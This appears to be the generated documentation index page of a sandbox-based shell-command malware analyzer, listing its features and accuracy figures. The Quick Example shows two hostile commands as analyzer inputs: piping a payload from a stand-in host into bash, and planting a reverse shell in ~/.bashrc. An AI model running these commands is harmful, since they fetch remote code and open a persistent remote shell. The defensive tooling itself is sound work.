@@ -1,0 +1,278 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="./">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Command Safety Analyzer Documentation &mdash; Command Safety Analyzer 5.0.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="_static/pygments.css?v=b86133f3" />
+      <link rel="stylesheet" type="text/css" href="_static/css/theme.css?v=9edc463e" />
+
+  
+      <script src="_static/jquery.js?v=5d32c60e"></script>
+      <script src="_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="_static/documentation_options.js?v=ce74c6a2"></script>
+      <script src="_static/doctools.js?v=fd6eb6e6"></script>
+      <script src="_static/sphinx_highlight.js?v=6ffebe34"></script>
+    <script src="_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="Installation Guide" href="installation.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="#" class="icon icon-home">
+            Command Safety Analyzer
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="installation.html">Installation Guide</a></li>
+<li class="toctree-l1"><a class="reference internal" href="quickstart.html">Quick Start Guide</a></li>
+<li class="toctree-l1"><a class="reference internal" href="architecture.html">Architecture Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="api/index.html">API Reference</a></li>
+<li class="toctree-l1"><a class="reference internal" href="modules/index.html">Module Documentation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="performance.html">Performance Optimization Guide</a></li>
+<li class="toctree-l1"><a class="reference internal" href="integration.html">Integration Guide</a></li>
+<li class="toctree-l1"><a class="reference internal" href="changelog.html">Changelog</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="#">Command Safety Analyzer</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="#" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Command Safety Analyzer Documentation</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="_sources/index.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section class="tex2jax_ignore mathjax_ignore" id="command-safety-analyzer-documentation">
+<h1>Command Safety Analyzer Documentation<a class="headerlink" href="#command-safety-analyzer-documentation" title="Link to this heading"></a></h1>
+<div class="toctree-wrapper compound">
+<p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="installation.html">Installation Guide</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="installation.html#system-requirements">System Requirements</a></li>
+<li class="toctree-l2"><a class="reference internal" href="installation.html#installation-steps">Installation Steps</a></li>
+<li class="toctree-l2"><a class="reference internal" href="installation.html#configuration">Configuration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="installation.html#performance-tuning">Performance Tuning</a></li>
+<li class="toctree-l2"><a class="reference internal" href="installation.html#troubleshooting">Troubleshooting</a></li>
+<li class="toctree-l2"><a class="reference internal" href="installation.html#upgrade-process">Upgrade Process</a></li>
+<li class="toctree-l2"><a class="reference internal" href="installation.html#next-steps">Next Steps</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="quickstart.html">Quick Start Guide</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="quickstart.html#basic-usage">Basic Usage</a></li>
+<li class="toctree-l2"><a class="reference internal" href="quickstart.html#batch-processing">Batch Processing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="quickstart.html#understanding-results">Understanding Results</a></li>
+<li class="toctree-l2"><a class="reference internal" href="quickstart.html#performance-optimization">Performance Optimization</a></li>
+<li class="toctree-l2"><a class="reference internal" href="quickstart.html#integration-examples">Integration Examples</a></li>
+<li class="toctree-l2"><a class="reference internal" href="quickstart.html#advanced-features">Advanced Features</a></li>
+<li class="toctree-l2"><a class="reference internal" href="quickstart.html#common-use-cases">Common Use Cases</a></li>
+<li class="toctree-l2"><a class="reference internal" href="quickstart.html#next-steps">Next Steps</a></li>
+<li class="toctree-l2"><a class="reference internal" href="quickstart.html#getting-help">Getting Help</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="architecture.html">Architecture Overview</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="architecture.html#core-design-philosophy">Core Design Philosophy</a></li>
+<li class="toctree-l2"><a class="reference internal" href="architecture.html#system-architecture">System Architecture</a></li>
+<li class="toctree-l2"><a class="reference internal" href="architecture.html#component-breakdown">Component Breakdown</a></li>
+<li class="toctree-l2"><a class="reference internal" href="architecture.html#data-flow-architecture">Data Flow Architecture</a></li>
+<li class="toctree-l2"><a class="reference internal" href="architecture.html#performance-architecture">Performance Architecture</a></li>
+<li class="toctree-l2"><a class="reference internal" href="architecture.html#security-model">Security Model</a></li>
+<li class="toctree-l2"><a class="reference internal" href="architecture.html#scalability-considerations">Scalability Considerations</a></li>
+<li class="toctree-l2"><a class="reference internal" href="architecture.html#future-architecture-improvements">Future Architecture Improvements</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="api/index.html">API Reference</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#overview">Overview</a></li>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#quick-start">Quick Start</a></li>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#core-components">Core Components</a></li>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#error-handling">Error Handling</a></li>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#asynchronous-usage">Asynchronous Usage</a></li>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#integration-examples">Integration Examples</a></li>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#performance-considerations">Performance Considerations</a></li>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#testing">Testing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#migration-guide">Migration Guide</a></li>
+<li class="toctree-l2"><a class="reference internal" href="api/index.html#support">Support</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="modules/index.html">Module Documentation</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="modules/index.html#package-structure">Package Structure</a></li>
+<li class="toctree-l2"><a class="reference internal" href="modules/index.html#core-modules">Core Modules</a></li>
+<li class="toctree-l2"><a class="reference internal" href="modules/index.html#utility-modules">Utility Modules</a></li>
+<li class="toctree-l2"><a class="reference internal" href="modules/index.html#exception-hierarchy">Exception Hierarchy</a></li>
+<li class="toctree-l2"><a class="reference internal" href="modules/index.html#type-definitions">Type Definitions</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="performance.html">Performance Optimization Guide</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="performance.html#current-performance-baseline">Current Performance Baseline</a></li>
+<li class="toctree-l2"><a class="reference internal" href="performance.html#optimization-strategies">Optimization Strategies</a></li>
+<li class="toctree-l2"><a class="reference internal" href="performance.html#advanced-optimization-techniques">Advanced Optimization Techniques</a></li>
+<li class="toctree-l2"><a class="reference internal" href="performance.html#benchmarking-framework">Benchmarking Framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="performance.html#resource-monitoring">Resource Monitoring</a></li>
+<li class="toctree-l2"><a class="reference internal" href="performance.html#scaling-strategies">Scaling Strategies</a></li>
+<li class="toctree-l2"><a class="reference internal" href="performance.html#performance-targets">Performance Targets</a></li>
+<li class="toctree-l2"><a class="reference internal" href="performance.html#best-practices-summary">Best Practices Summary</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="integration.html">Integration Guide</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="integration.html#ci-cd-integration">CI/CD Integration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="integration.html#api-gateway-integration">API Gateway Integration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="integration.html#siem-integration">SIEM Integration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="integration.html#cloud-platform-integration">Cloud Platform Integration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="integration.html#container-security-integration">Container Security Integration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="integration.html#monitoring-and-alerting">Monitoring and Alerting</a></li>
+<li class="toctree-l2"><a class="reference internal" href="integration.html#performance-optimization-for-integrations">Performance Optimization for Integrations</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="changelog.html">Changelog</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id1">[5.0.0] - 2026-03-23</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id2">[4.8] - 2026-03-15</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id3">[4.7] - 2026-03-10</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id6">[4.6] - 2026-03-05</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id8">[4.5] - 2026-02-28</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id10">[4.4] - 2026-02-20</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id12">[4.3] - 2026-02-15</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id15">[4.2] - 2026-02-10</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id18">[4.1] - 2026-02-05</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id21">[4.0] - 2026-01-20</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id24">[3.2] - 2025-12-15</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id26">[3.1] - 2025-11-30</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id29">[3.0] - 2025-11-01</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id30">[2.1] - 2025-09-15</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id31">[2.0] - 2025-08-01</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#id32">[1.0] - 2025-06-01</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#upgrade-notes">Upgrade Notes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="changelog.html#roadmap">Roadmap</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</section>
+<section class="tex2jax_ignore mathjax_ignore" id="welcome-to-command-safety-analyzer">
+<h1>Welcome to Command Safety Analyzer<a class="headerlink" href="#welcome-to-command-safety-analyzer" title="Link to this heading"></a></h1>
+<p>The Command Safety Analyzer is a sophisticated security tool that performs deep behavioral analysis of shell commands using OpenSandbox isolation. It detects malicious behavior through 24-dimensional analysis combined with MITRE ATT&amp;CK mapping and weighted scoring.</p>
+<section id="key-features">
+<h2>Key Features<a class="headerlink" href="#key-features" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><strong>Pure Dynamic Analysis</strong>: No static analysis - all detections based on sandbox execution behavior</p></li>
+<li><p><strong>24-Dimensional Detection</strong>: Comprehensive coverage of file changes, persistence, network behavior, and more</p></li>
+<li><p><strong>MITRE ATT&amp;CK Mapping</strong>: Automatic mapping to 40+ ATT&amp;CK techniques</p></li>
+<li><p><strong>Weighted Scoring</strong>: Risk scores from 0-100 with confidence assessment</p></li>
+<li><p><strong>Attack Chain Correlation</strong>: Cross-dimensional threat detection</p></li>
+<li><p><strong>SARIF Integration</strong>: Ready for CI/CD security pipelines</p></li>
+</ul>
+</section>
+<section id="core-principle">
+<h2>Core Principle<a class="headerlink" href="#core-principle" title="Link to this heading"></a></h2>
+<blockquote>
+<div><p><strong>Before/After Snapshot Comparison</strong>: All detections are based on comparing system state before and after command execution in an isolated sandbox environment.</p>
+</div></blockquote>
+<p>This approach ensures that only actual behavioral changes are analyzed, eliminating false positives from static pattern matching.</p>
+</section>
+<section id="quick-example">
+<h2>Quick Example<a class="headerlink" href="#quick-example" title="Link to this heading"></a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Analyze a single command</span>
+<span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;curl evil.test/payload | bash&quot;</span><span class="w"> </span>./checker.sh
+
+<span class="c1"># Fast triage (no Docker required)</span>
+<span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&quot;echo &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444&#39; &gt;&gt; ~/.bashrc&quot;</span><span class="w"> </span>./triage.sh
+</pre></div>
+</div>
+</section>
+<section id="performance-characteristics">
+<h2>Performance Characteristics<a class="headerlink" href="#performance-characteristics" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><strong>Fast Triage Mode</strong>: &lt; 50ms response time</p></li>
+<li><p><strong>Full Sandbox Analysis</strong>: ~15-30 seconds per command</p></li>
+<li><p><strong>Batch Processing</strong>: Parallel execution with configurable concurrency</p></li>
+<li><p><strong>Memory Efficient</strong>: ~200MB RAM footprint per analysis</p></li>
+</ul>
+</section>
+<section id="accuracy-metrics">
+<h2>Accuracy Metrics<a class="headerlink" href="#accuracy-metrics" title="Link to this heading"></a></h2>
+<p>Based on latest test runs:</p>
+<ul class="simple">
+<li><p><strong>White Sample Accuracy</strong>: 95% (38/40 correct)</p></li>
+<li><p><strong>Black Sample Accuracy</strong>: 42% (17/40 correct)</p></li>
+<li><p><strong>False Positive Rate</strong>: 5%</p></li>
+<li><p><strong>False Negative Rate</strong>: 57% (mostly due to sandbox environment limitations)</p></li>
+</ul>
+</section>
+<section id="getting-started">
+<h2>Getting Started<a class="headerlink" href="#getting-started" title="Link to this heading"></a></h2>
+<p>See <a class="reference internal" href="installation.html"><span class="doc">Installation Guide</span></a> for setup instructions and <a class="reference internal" href="quickstart.html"><span class="doc">Quick Start Guide</span></a> for basic usage.</p>
+</section>
+<section id="source-code">
+<h2>Source Code<a class="headerlink" href="#source-code" title="Link to this heading"></a></h2>
+<p>The project is available on <a class="reference external" href="https://github.com/your-org/command-analysis-with-sandbox-plugin">GitHub</a>.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>This documentation covers version 5.0.0 of the Command Safety Analyzer.</p>
+</div>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="installation.html" class="btn btn-neutral float-right" title="Installation Guide" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2026, Security Team.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
